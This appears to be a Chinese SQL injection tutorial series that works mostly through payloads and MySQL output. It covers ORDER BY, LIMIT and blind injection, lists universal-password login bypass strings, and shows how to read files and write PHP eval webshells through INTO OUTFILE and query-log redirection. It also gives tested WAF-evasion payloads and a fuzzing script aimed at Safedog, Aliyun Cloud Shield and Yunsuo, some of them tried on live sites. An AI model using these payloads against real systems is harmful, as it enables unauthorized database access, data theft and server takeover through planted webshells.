+mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),username,password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+
+http://127.0.0.1/sqli/Less-46/?sort=if((substr((select user()),1,1)='r'),username,password)
+
+</code></pre><ol start="2"><li>时间盲注</li></ol><p>时间盲注不能直接简单的 <code>sleep()</code> 因为他会对每条内容来执行你的语句，所以会造成 dos 测试获取速度慢等问题，这时候我们需要用到子查询</p><pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),sleep(5),password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    3 | bdmin    | fdmin    |
+|    2 | admin    | ddmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (15.01 sec)
+
+</code></pre><p>我们写一条简单的子查询试试</p><pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),(select 1 from (select sleep(2)) as b),password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    3 | bdmin    | fdmin    |
+|    2 | admin    | ddmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (2.01 sec)
+
+</code></pre><h2 id="报错注入"><a class="anchor" href="#报错注入">#</a> 报错注入</h2><pre><code>http://127.0.0.1/sqli/Less-46/?sort=(extractvalue(1,concat(0x3a,version())),1)
+
+mysql&gt; select * from admin order by (extractvalue(1,concat(0x3a,version())),1);
+ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
+
+</code></pre><h1 id="0x01-from"><a class="anchor" href="#0x01-from">#</a> 0x01 From</h1><p>from 后面的注入比较少 还是提一下</p><pre><code>select * from $id;
+
+</code></pre><ol><li><p>可以结合 order by 来注入</p></li><li><p>可以使用联合注入来注入</p></li></ol><pre><code>mysql&gt; select * from admin union select 1,user(),3;
++------+----------------+----------+
+| id   | username       | password |
++------+----------------+----------+
+|    3 | bdmin          | fdmin    |
+|    2 | admin          | ddmin    |
+|    1 | cdmin          | bdmin    |
+|    1 | root@localhost | 3        |
++------+----------------+----------+
+4 rows in set (0.02 sec)
+
+</code></pre><p>方法跟普通注入一样的一样自己加上表名</p><h1 id="0x02-limit"><a class="anchor" href="#0x02-limit">#</a> 0x02 limit</h1><p>这种注入也不是很常见，依照 <span class="exturl" data-url="aHR0cHM6Ly9yYXRlaXAuY29tL2Jsb2cvc3FsLWluamVjdGlvbnMtaW4tbXlzcWwtbGltaXQtY2xhdXNlLw==">https://rateip.com/blog/sql-injections-in-mysql-limit-clause/</span> 来提一下</p><pre><code>mysql&gt; select * from admin where id &gt;0 limit 0,1 $id
+
+</code></pre><p>如何利用呢 大佬们已经给出方法了 用 <code>PROCEDURE ANALYSE</code> 配合报错注入，所以多看文档，如果你想提升下自己的水平</p><pre><code>mysql&gt; select * from admin where id &gt;0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
+ERROR:
+No query specified
+
+</code></pre><p>这里延时只能使用 <code>BENCHMARK()</code> 如同</p><pre><code>select * from admin where id &gt;0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);
+
+</code></pre><h1 id="0x00-再谈万能密码登陆"><a class="anchor" href="#0x00-再谈万能密码登陆">#</a> 0x00 再谈万能密码登陆</h1><p>万能密码基本大家都用过，各种各样的，如下</p><pre><code>'or 1=1/*
+&quot;or &quot;a&quot;=&quot;a
+&quot;or 1=1--
+&quot;or&quot;=&quot;
+&quot;or&quot;=&quot;a'='a
+&quot;or1=1--
+&quot;or=or&quot;
+''or'='or'
+') or ('a'='a
+'.).or.('.a.'='.a
+'or 1=1
+'or 1=1--
+'or 1=1/*
+'or&quot;=&quot;a'='a
+'or' '1'='1'
+'or''='
+'or''=''or''='
+'or'='1'
+'or'='or'
+'or.'a.'='a
+'or1=1--
+1'or'1'='1
+a'or' 1=1--
+a'or'1=1--
+or 'a'='a'
+or 1=1--
+or1=1--
+
+</code></pre><p>其实根据前面的文章我们很容易看出 他的原理就是让我们的条件恒成立 至于为什么这么多种，就是根据语句的形势来闭合的，</p><p>这里面涉及到运算符的优先级，MySQL 运算的特性，然后下面我们以几个例子来做做最另类的万能密码</p><pre><code>mysql&gt; select * from admin where name = '/*' and pass = '*/';
+Empty set (0.00 sec)
+
+</code></pre><p>注释绕过</p><pre><code>mysql&gt; select * from admin where name = ''or 1=1-- ' and pass = '123';
+    -&gt; ;
++----+-----------+-------+
+| id | name      | pass  |
++----+-----------+-------+
+|  1 | admin     | admin |
+|  2 | admin'111 | 11111 |
+|  3 | admin'111 | 11    |
+|  4 | admin'111 | 11    |
++----+-----------+-------+
+4 rows in set (0.00 sec)
+
+</code></pre><p>经典的 <code>or 1=1--</code> 其中 1=1 恒为 true 然后导致每条数据都成立返回</p><p>那么知道了这个原理怎么构造一个简单的万能密码呢</p><pre><code>mysql&gt; select ''=0
+    -&gt; ;
++------+
+| ''=0 |
++------+
+|    1 |
++------+
+1 row in set (0.00 sec)
+
+mysql&gt; select 1=0=0;
++-------+
+| 1=0=0 |
++-------+
+|     1 |
++-------+
+1 row in set (0.30 sec)
+
+</code></pre><p>我们可以看到在 mysql 中 空字符串 '' 等于 0 为 1 也就是 true 知道这个特性我们可以来构造我们的万能密码了</p><pre><code>mysql&gt; select * from admin where name = ''|0#'  and pass = '123';
+    -&gt; ;
++----+-----------+-------+
+| id | name      | pass  |
++----+-----------+-------+
+|  1 | admin     | admin |
+|  2 | admin'111 | 11111 |
+|  3 | admin'111 | 11    |
+|  4 | admin'111 | 11    |
++----+-----------+-------+
+4 rows in set, 5 warnings (0.00 sec)
+
+</code></pre><p>仅仅用了 <code>'|0#</code> 个字符就能达到我们的效果 其他方法大家还可以测试，因为是自己发现的，然后问了几个师傅 发现 ctf 已经别人都用过了 ，不得不承认自己的知识量远远不够。</p><h1 id="0x00-读写文件与堆叠查询"><a class="anchor" href="#0x00-读写文件与堆叠查询">#</a> 0x00 读写文件与堆叠查询</h1><p>MySQL 中 在在 mysql 5.6.34 版本以后 secure_file_priv 的值默认为 NULL , 而 secure_file_priv 为 null 那么我们就不能导出文件，以下都建立在</p><p>secure_file_priv 的默认值被修改为无才能利用，且这个只能手工修改配置文件不能用 sql 语句，也就是想直接导出需要管理员不知道干了什么帮你修改好这个权限才行。</p><p>windows 系统在 my.ini 的 [mysqld] 下面加上 secure_file_priv = ，linux 的在 /etc/my.cnf 同时读写权限问题就不用说了。</p><pre><code>mysql&gt; show global variables like '%secure%';
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_auth      | OFF   |
+| secure_file_priv |       |
++------------------+-------+
+2 rows in set (0.00 sec)
+
+</code></pre><h1 id="0x01-读文件"><a class="anchor" href="#0x01-读文件">#</a> 0x01 读文件</h1><p>可以把文件 hex 一下输出，文件名也是支持 hex 和 char 的</p><pre><code>mysql&gt; select * from admin union select 1,hex(load_file('D:\\1.txt')),3;
++------+------------------------+----------+
+| id   | username               | password |
++------+------------------------+----------+
+|    3 | bdmin                  | fdmin    |
+|    2 | admin                  | ddmin    |
+|    1 | cdmin                  | bdmin    |
+|    1 | 617574686F72A3BA343034 | 3        |
++------+------------------------+----------+
+4 rows in set (0.02 sec)
+
+http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,hex(load_file(0x463A5C5C312E747874)),3-- +
+
+</code></pre><p>当然你加入你进了 phpmyadmin 类似的平台 可以执行 sql 语句，你可以选择把导入的数据插入表中<br>同时支持导入的函数还有 <code>load data infile</code></p><pre><code>create table test(test text);
+insert into test(test) values (load_file('D:\\1.txt'));
+select * from test;
+
+</code></pre><p>如果能读文件在渗透测试中往往很有用，可以读取配置文件，系统问题等等关键信息，在我以前的一次意淫中，进入一个后台功能全被限制死了，但是可以执行导入，通过一个编辑器的目录遍历，发现某文件时间不一致，读取出来发现是 webshell，应该是某黑客进去之后做的手脚</p><h1 id="0x02-写文件"><a class="anchor" href="#0x02-写文件">#</a> 0x02 写文件</h1><ol><li></li></ol><p>写文件我们一般用到 <code>dumpfile</code> 与 <code>outfile</code> 她们其实是有区别</p><p><code>outfile</code> 会在行末写入新行，而且会转义换行符</p><p><code>dumpfile</code> 能导出一个完整的文件，不会有任何转义 所以我们 udf 提取一般用的 dumpfile</p><pre><code>
+mysql&gt; select * from admin where id =1 union select 1,'&lt;?php eval($_POST[cmd]);?&gt;',3 into outfile 'G:\\test.txt';
+Query OK, 2 rows affected (0.00 sec)
+
+</code></pre><ol start="2"><li></li></ol><p>后来大佬们找到一种方法通过日志来写 shell 解决这个史诗级难题，但是需要能直接执行 sql 语句利用有限</p><pre><code>set global general_log=on;
+set global general_log_file='D://404.php';
+select '&lt;?php eval($_POST['404']) ?&gt;';
+
+</code></pre><p>通过把日志路径更改 ，让查询的日志保存过去，还有一种慢日志，原理一样</p><pre><code>mysql&gt; show global variables like '%query_log%'
+    -&gt; ;
++---------------------+-------------------------------------------------------------+
+| Variable_name       | Value                                                       |
++---------------------+-------------------------------------------------------------+
+| slow_query_log      | OFF                                                         |
+| slow_query_log_file | D:\phpstudy\PHPTutorial\MySQL\data\LAPTOP-M4APUKKN-slow.log |
++---------------------+-------------------------------------------------------------+
+2 rows in set (0.00 sec)
+
+</code></pre><pre><code>set global slow_query_log=1;
+
+set global slow_query_log_file='D://404.php'
+
+select '&lt;?php eval($_POST['404']) ?&gt;' or sleep(15);
+
+</code></pre><h1 id="0x03-堆叠查询"><a class="anchor" href="#0x03-堆叠查询">#</a> 0x03 堆叠查询</h1><p>mysql 是支持堆叠查询的用 <code>;</code> 分割语句，但是 php 原生的连接方式不支持，但是使用 PDO,mysqli_multi_query () 等等是支持多语句的，在我们使用堆叠查询的时候基本是没有回显的，而且其实很难遇到这种环境。</p><pre><code>mysql&gt; select * from admin where id =1;select user();
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+1 row in set (0.00 sec)
+
++----------------+
+| user()         |
++----------------+
+| root@localhost |
++----------------+
+1 row in set (0.00 sec)
+
+</code></pre><p>这里讲在一起就是因为，假如支持堆叠查询还可以用日志来写 shell。</p><pre><code>
+http://192.168.59.129/Less-38/?id=1%27;set global general_log=on;set global general_log_file='C://phpstudy//404.php';--+
+
+http://192.168.59.129/Less-38/?id=1%27;select '&lt;?php eval($_POST[404]) ?&gt;';--+
+
+</code></pre><h1 id="0x00-联合注入过狗"><a class="anchor" href="#0x00-联合注入过狗">#</a> 0x00 联合注入过狗</h1><p>其实我们过这些 waf 就是个正则的绕过，因为这种通用型的 waf，需要考虑到用户体验，他不能出现什么东西就直接拦截，比正则过滤的一些好绕一点，如何成功绕过我们需要具备对 mysql 各个函数、语法、特性的熟悉，然后通过不断的 fuzz 来测试出我们想要的 payload 的</p><p>每个狗的版本不同，他的正则也是不同的所以有的 payload 在最新版可以用，在老版本就可能用不上，当你的知识量有一定的积累后，绕过 waf 或许就很简单，</p><p>如何快速的提升自己的这些知识，多看文章，多看官方手册。</p><h1 id="0x01-探索-and"><a class="anchor" href="#0x01-探索-and">#</a> 0x01 探索 and</h1><p>实验环境 ： win2003 apache 安全狗 4.0.23957</p><p>首先我们来探索简单的语句 <code>and 1=1</code></p><pre><code>and 1    拦截
+and '1'  拦截
+and a    不拦截
+and 'a'  拦截
+and !    不拦截
+and 1+1  拦截
+and 1+a  拦截
+and hex(1) 不拦截
+
+</code></pre><p>通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有 2 个思路</p><ol><li><p>用其他字符替换 and 或者 or</p></li><li><p>带入的不是字符串和数字型，带入一个特殊符号</p></li></ol><p>针对第一种我们可以去看看运算符号 随便找到几个 <code>| ^ xor &amp; / * &amp;&amp; ||</code> 等等还有很多</p><pre><code>mysql&gt; select '1'|1;
++-------+
+| '1'|1 |
++-------+
+|     1 |
++-------+
+1 row in set (0.00 sec)
+
+
+mysql&gt; select '1'&amp;1;
++-------+
+| '1'&amp;1 |
++-------+
+|     1 |
++-------+
+1 row in set (0.00 sec)
+
+mysql&gt; select '1'^1;
++-------+
+| '1'^1 |
++-------+
+|     0 |
++-------+
+1 row in set (0.00 sec)
+
+
+</code></pre><p>知道这个了我们带入我们的语法就很简单了 通过运算符来改变 ID 的值 查看页面是否变化 这是可行的。</p><pre><code>mysql&gt; select * from admin where id ='1'|2-- +';
+    -&gt; ;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    3 | bdmin    | fdmin    |
++------+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from admin where id ='1'|1-- +';
+    -&gt; ;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+1 row in set (0.00 sec)
+
+</code></pre><p>经过测试你还会发现他的正则不全 <code>&amp;&amp; true</code> 也是可以的。</p><p>那我们可以不可以正面刚 <code>and</code> <code>or</code> 呢，当然也是可行的，前面我们测试过 <code>and hex(1)</code> 不拦截其实已经可以拿来判断了，但是我们还要深入的探究</p><p><code>and hex(1)=</code> 也是不拦截的 但是后面加入字符型和数字型他又开始拦截，所以我们可以猜测 他判断 = 左右的字符类型，经过测试就能出来很多我们想要的</p><pre><code>and ~1&gt;1
+
+and hex(1)&gt;-1
+
+and hex(1)&gt;~1
+
+</code></pre><p>再深入探究 你就会发现 安全狗他只在乎 数字型的正数，而不在乎负数，也就是 <code>and -2&lt;-1</code> 就能过狗，也可能是 <code>-</code> 绕过了他的正则</p><h1 id="0x02-探索-union-select"><a class="anchor" href="#0x02-探索-union-select">#</a> 0x02 探索 union select</h1><ol><li>内联注释绕过</li></ol><pre><code>union    不拦截
+select   不拦截
+union select 拦截
+union 各种字符 select 拦截
+union/*select*/ 不拦截
+
+</code></pre><p>通过简单的测试我们发现安全狗还是认识我们我们的注释的符号的，所以我们就需要通过这个来绕过我们的安全狗，前面符号一章我讲过注释符号的几种，我们主要使用的是</p><p>内联注释 <code>/*!/*!*/</code></p><pre><code>http://192.168.59.129/Less-1/?id=1' union/*!/*!50000select*/ 1,2,3--+  拦截
+
+http://192.168.59.129/Less-1/?id=1' union/*!/*!5select*/ 1,2,3--+  不拦截
+
+
+</code></pre><p>为什么不拦截 ，因为 50000 是他的版本号，你多一位少一位语句是不能能正常执行的，所以他就放行了，那么我们可以用 burp 来遍历这个值呢，结果的确是我们想要的</p><pre><code>http://192.168.59.129/Less-1/?id=1' union/*!/*!11440select*/ 1,2,3--+ 不拦截
+
+http://192.168.59.129/Less-1/?id=1' union/*!11441/*!11440select*/ 1,2,3--+ 不拦截
+
+http://192.168.59.129/Less-1/?id=1' union/*!11440select*/ 1,2,3--+ 不拦截
+
+http://192.168.59.129/Less-1/?id=-1' union/*!11440/**/%0aselect*/ 1,2,3--+  不拦截
+
+</code></pre><p>这句 bypass 的核心就在于版本号，然后你就感觉 fuzz 了千种姿势，但是核心还是这个，最简也是这个，万变不离其宗。<br>2. 注释绕过</p><p>联想注释我们还知道有 -- # 那么他们可以利用吗，当然是肯定的，其实很久以前就有大佬发过这个语句了是<br><code>union %23%0aselect</code> 因为这些都是单行注释，而 %0a 是换行的 url 编码，大家可以换行后用 url 编码看看，就是这个，<br>但是这样已经被加入规则库了，如何绕过呢 非常简单 当然这是个 fuzz 的过程，其实我只想写出思路，而不是直接给 payload。</p><pre><code>union %23%0aselect 拦截
+
+union %23select 拦截
+
+union a%23 select 不拦截
+
+union all%23 select 不拦截
+
+union all%23%0a select 不拦截
+
+union %23%0aall select 不拦截
+
+
+</code></pre><p>有时候 fuzz 右边不行 不如看看左边 为什么可以加 all 这个你就得看看 mysql 手册了，其实测试到最后发现 %23%0a 中间不能加字符否则会被拦截。</p><ol start="3"><li>-- 注释绕过</li></ol><p>-- 其实大佬们也一样很早说了不过最初的姿势是 <code>-- %0a</code> 当然已经被加入豪华午餐了，所以我们来测试</p><pre><code>union all -- %0a select 拦截
+
+union  -- ()%0a select 拦截
+
+union  -- 1%0a select 不拦截
+
+union  -- hex()%0a select 不拦截
+
+</code></pre><p>懂我意思吧，怎么绕出来，发挥你的现象，总之俩开花。</p><ol start="4"><li>老生常谈 hpp 被人遗忘的手法</li></ol><p>前面说过 <code>/**/</code> 里面的内容安全狗基本不管了，那么我们用 hpp 参数污染来绕过就很简单了<br>照成这个手法的原因是 web server 对参数的解析问题 在 php/apache 中 它总解析最后一个 id</p><pre><code>http://192.168.59.129/Less-1/?id=-1' /*&amp;id='union select 1,user(),3 -- +*/
+
+</code></pre><h1 id="0x03-注入"><a class="anchor" href="#0x03-注入">#</a> 0x03 注入</h1><p>既然绕过了 <code>union select</code> 那么注入就简单了 首先来看个 <code>user()</code> , 因为它是被拦截的所以我们需要简单的绕过它</p><pre><code>user()   拦截
+user/**/() 拦截
+user/**/(/**/) 拦截
+hex(user/**/(/**/)) 不拦截
+
+</code></pre><p>接着就是爆库名</p><pre><code>union  -- hex()%0a select 1,schema_name,3 from `information_schema`.schemata limit 1,1
+
+</code></pre><p>接下来的流传都差不多了 关键点就是在于 from 后面这块 后面的我以这个 <code>information_schema.schemata</code> 为例展示几种思路可能有的不能过</p><pre><code>`information_schema`.schemata
+`information_schema`.`schemata`
+information_schema.`schemata`
+(information_schema.schemata)
+information_schema/**/.schemata
+
+</code></pre><h1 id="0x04-文末"><a class="anchor" href="#0x04-文末">#</a> 0x04 文末</h1><p>这么多手法又有多少人认真看了呢，认真去试过，探索。</p><h1 id="0x00-延时过狗"><a class="anchor" href="#0x00-延时过狗">#</a> 0x00 延时过狗</h1><p>盲注过狗相对联合注入来说，感觉上是更简单，我们先来试试时间盲注把，比布尔稍稍灵活一点</p><pre><code> if(1,1,1) 不拦截
+ a if(1,1,1) 不拦截
+ and if(1,1,1) 拦截
+ | if(1,1,1) 不拦截
+ || if(1,1,1) 拦截
+ &amp;&amp; if(1,1,1) 拦截
+/*!and*/ if(1,1,1) 拦截
+ /*!11440and*/ if(1,1,1) 不拦截
+ andaif(1,1,1) 不拦截
+
+</code></pre><p>通过上面的测试我们其实可以很简单的看出来 他是拦截的 xx if 这个语句，其中 xx 为 and 和 or 这 2 个词有点敏感，但是绕过还是可以的</p><p>通过上一章的测试语句 发现版本为 11440 的 内联注释直接放行，咳咳这样后面就直接注入，感觉并不是我们这一章想要的，我们这一章来试试不用内联注释内不内绕过</p><p>查阅乌云知识库发现一个小知识点 <code>and!!!1=1</code> and 后面可以接上奇数个特殊的字符包括不限于 <code>! ~ &amp; -</code> 其他还可以自己测试 那么我们的 payload 就能构造出来了</p><pre><code>and!!!if((substr((select hex(user/**/(/*!*/))),1,1)&gt;1),sleep/**/(/*!5*/),1)
+
+</code></pre><p>系统函数怎绕过我就不多说了每一张就有</p><h1 id="0x01-布尔过狗"><a class="anchor" href="#0x01-布尔过狗">#</a> 0x01 布尔过狗</h1><p>布尔注入过狗只能说是相对来说最简单的吧，因为可以不使用条件语句，少了一个绕过点</p><pre><code>and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)='r' 拦截
+
+and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=r 不拦截
+
+and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=1 不拦截
+
+
+</code></pre><p>上面忘了说的就是这个点 =r 这里 不能使用引号，那绕过他就很简单了 什么 HEX ASCII 都行，通过测试发现 使用布尔盲注 他的过滤真的很差，我们试试 把 and 换成 &amp;&amp;</p><pre><code>and substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截
+
+/*!and*/ substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截
+
+%26%26 substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截
+
+/*!%26%26*/ substr((select hex(user/**/(/*!*/))),1,1)&gt;1 不拦截
+
+</code></pre><h1 id="0x02-文末-3"><a class="anchor" href="#0x02-文末-3">#</a> 0x02 文末</h1><p>自己不测试 永远发现不了新东西</p><h1 id="0x00-探索报错"><a class="anchor" href="#0x00-探索报错">#</a> 0x00 探索报错</h1><p>报错注入的绕过，感觉很少人提过，不少人绕过也有一定的误区吧，这里提一提</p><pre><code>updatexml 不拦截
+
+updatexml(1,2,3 不拦截
+
+updatexml(1,2) 不拦截
+
+updatexml(1,2,) 不拦截
+
+updatexml(,2,1) 不拦截
+
+updatexml(1,2,!) 拦截
+
+updatexml(1,2,%) 拦截
+
+updatexml(,2,1,hex()) 拦截
+
+and updatexml(1,2,3 不拦截
+
+updatexml(1,2,3) 拦截
+
+and updatexml(1,2,3) 拦截
+
+
+</code></pre><p>到这里我们 大概知道了，他的判断 <code>updatexml()</code> 的完整性 ，当里面按逗号分割出现出现 3 个字符时，就会拦截，当然有个别特殊的字符串他没过滤</p><p>这样我们在括号里面做手脚的可能性很渺茫，那么我们还有 什么方法呢， 可以尝试把 <code>updatexml()</code> 函数分开，或者给 updatexml 加个外套。</p><pre><code> /*updatexml*/(1,1,1) 不拦截
+
+ /*!updatexml*/(1,1,1) 拦截
+
+ /*!5000updatexml*/(1,1,1) 不拦截
+
+ /*!11440updatexml*/(1,1,1) 不拦截
+
+</code></pre><p>看来 <code>updatexml()</code> 函数我们已经绕过了 需要前面加个 运算符号了</p><pre><code>and /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)  拦截
+
+or /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截
+
+/*!and*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截
+
+/*!%26%26*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+/*!||*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+/*!xor*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+ | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+ xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+</code></pre><p>那么有没有什么可以包裹他的呢，其实我们查看 mysql 手册找到这么一个符号 开单引号 ASCII 96</p><pre><code>http://192.168.130.135/Less-1/?id=1' and `updatexml`(1,(select hex(user/**/(/**/))),1)-- +
+
+</code></pre><p>那么我们写个小脚本跑看看 还有没有</p><pre><code>import requests
+import urllib
+
+for i in range(0,177):
+    url = r&quot;http://192.168.130.135/Less-1/?id=1%27%20xor%20&#123;fuzz&#125;updatexml&#123;fuzz&#125;(1,(select hex(user/**/(/**/))),1)--%20+&quot;.format(fuzz=urllib.quote(chr(i)))
+    req = requests.get(url)
+    if &quot;F6F7&quot; in req.text:
+        print len(req.text),i,urllib.quote(chr(i))
+
+</code></pre><p>发现确实没有其他利用的了，当然你用前面的注释方法也是可行的</p><h1 id="0x01-文末"><a class="anchor" href="#0x01-文末">#</a> 0x01 文末</h1><p>脚本只是你的一个思路衍生</p><h1 id="0x00-矛与云盾过狗"><a class="anchor" href="#0x00-矛与云盾过狗">#</a> 0x00 矛与云盾过狗</h1><p>由于没有阿里云盾的试验环境，以下操作都在线上测试，总的来说阿里云还是比较不好绕的，因为对于 <code>/**/ /*!*/</code> 他是强过滤，根本不能用，我们先来测试简单语句</p><pre><code>and 1=1 拦截
+
+&amp;&amp; 1=1 不拦截
+
+or 1=1 拦截
+
+|| 1=1 不拦截
+
+and 1 不拦截
+
+and 1= 拦截
+
+and = 拦截
+
+and 1&gt; 不拦截
+
+and 1&gt;1 拦截
+
+and 1&gt;a 拦截
+
+and 1&gt;! 不拦截
+
+</code></pre><p>通过简单的测试我们发现，他对 &amp;&amp; || 过滤还是不是很严 ，and 的话是不让用直接接入 = 号的，综合一下前面的知识，我们可以想到几个方法。</p><ol><li><p>不用 and 和 or</p></li><li><p>用 and 在两边接入干扰字符</p></li></ol><pre><code>and ~1=1   不拦截
+
+and!!!1=1  不拦截
+
+and 1-1    不拦截
+
+and true 不拦截
+
+and 1 不拦截
+
+</code></pre><h1 id="0x01-注入"><a class="anchor" href="#0x01-注入">#</a> 0x01 注入</h1><ol><li>盲注</li></ol><pre><code> and substr(1,1,1)='r' 拦截
+
+ &amp;&amp;  substr(1,1,1)='r'  不拦截
+
+ and!!!substr(1,1,1)='r' 不拦截
+
+ and!!!substr((select),1,1)='r' 不拦截
+
+ and!!!substr((select a()),1,1)='r' 不拦截
+
+ and!!!substr((select user()),1,1)='r' 拦截
+
+
+</code></pre><p>可以知道 select 后面加入 常见函数会被拦截，所以我们可以 使用一定的东西来分割他 但是 <code>/**/</code> 和 <code>/*!*/</code> 是不能用的，所以最后想到 就是 注释符号</p><pre><code>and!!!substr((select user-- (1)%0a()),1,1)='r' 不拦截  edu
+
+
+</code></pre><p>测试一会儿发现他对某些关键词拦截还是很严格的，绕过应该是可以的，一些生僻的函数加点东西 他就不会拦截</p><pre><code>and!!!substr((select @@`datadir`),1,1)='D'-- + 拦截                     yq
+and!!!substr((select&#123;x @@datadir&#125;),1,1)='D' 不拦截
+and!!!substr((select&#123;x @@`datadir`&#125;),1,1)='D'-- + 不拦截
+
+</code></pre><p>这里比较难的是 from 的绕过，虽然最后绕过了，但是感觉不是很完美</p><pre><code>from 不拦截
+
+from user 不拦截
+
+select from user 拦截                edu
+
+select all from user 拦截
+
+select from(user) 拦截
+
+select from&#123;user&#125; 拦截
+
+select from[user] 不拦截
+
+select from [user] 拦截
+
+
+
+</code></pre><p>最后想到 web+mysql 好像编码的问题 也能让解析我们的中文字符 但是这种对环境要求比较大</p><pre><code>and!!!substr((select&#123;x username&#125;from（users） limit 0,1),1,1)='D'
+
+http://127.0.0.1/sqli/Less-1/?id=1%27 and!!!substr((select username from【users】 limit 0,1),3,1)='m'-- +
+
+</code></pre><ol start="2"><li>联合</li></ol><p>前面测试发现 内联注释不能使用了，只能靠括号之类的来干扰了</p><pre><code>union select   不拦截
+
+union select 1 拦截
+
+union(select 1) 不拦截
+
+union(select 1,2,3) 不拦截
+
+</code></pre><ol start="3"><li>报错</li></ol><pre><code>and `updatexml`(1,select `user`%0a(),1) 
+</code></pre><p><img data-src="2.4.1.png" alt="mysql"></p><p><img data-src="2.4.2.png" alt="mysql"></p><p>阿里云的需要深度探索才能绕过，规则还是比较困难的，相对于安全狗，因为 edu 和 yq 的云盾好像版本不同，绕过的手法也要不一样，具体思路就是这样的，由于我直接在官网测试的，所以可能有点问题。</p><h1 id="我与云锁有个约会"><a class="anchor" href="#我与云锁有个约会">#</a> 我与云锁有个约会</h1><h2 id="0x00-简单and探索"><a class="anchor" href="#0x00-简单and探索">#</a> 0x00 简单 and 探索</h2><p>首先都是来测试下 and 的绕过</p><pre><code>and 不拦截
+
+and 1 拦截
+
+and a 不拦截
+
+and 'a' 不拦截
+
+and 'a' &gt; &lt; =  拦截
+
+</code></pre><p>差不多知道他的规则了 绕过来就很简单了</p><pre><code>mysql&gt; select 'a'-0;
++-------+
+| 'a'-0 |
++-------+
+|     0 |
++-------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; select 'a'+1;
++-------+
+| 'a'+1 |
++-------+
+|     1 |
++-------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; select 'a'|1;
++-------+
+| 'a'|1 |
++-------+
+|     1 |
++-------+
+1 row in set, 1 warning (0.00 sec)
+
+
+and 'a'-0  不拦截
+
+and 'a'|1  不拦截
+
+</code></pre><h2 id="0x01-我与云锁有个约会"><a class="anchor" href="#0x01-我与云锁有个约会">#</a> 0x01 我与云锁有个约会</h2><p>早期云锁绕过非常简单，只需要在 post 和 get 同时提交数据 他会只检测 post 的内容，很轻松的绕过，但是更新后云锁也是很多人谈之色变的。</p><p>以下内容都是把云锁的增强型防护开启</p><ol><li>简单的布尔盲注</li></ol><pre><code>and strcmp((substr((select user/**/()),2,1)),'0')
+
+</code></pre><p>生僻函数绕过 这里比较难的点其实也在 from，但是比云盾好点，毕竟可以用到注释</p><pre><code>http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select from),2,1)),'0')-- +  拦截
+
+http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select /*from*/),2,1)),'0')-- + 不拦截
+
+</code></pre><p>看到这两条语句其实我们可以清楚的知道 <code>/**/</code> 是我们可以利用的点，结合前面的知识我们只需要把我们的 from 放在注释里面然后把注释不起作用就 OK</p><pre><code>http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')-- +
+
+</code></pre><p><img data-src="2.5.1.png" alt="mysql"></p><ol start="2"><li>时间盲注</li></ol><p>时间盲注换换就行</p><pre><code>http://192.168.130.135/Less-1/?id=1'  and if((strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')),1,sleep(5))-- +
+
+</code></pre><ol start="3"><li>报错注入</li></ol><pre><code>http://192.168.130.135/Less-1/?id=1'  and `updatexml`(1,concat(0x7e,(select user/**/()),0x7e),1)/**/-- +
+
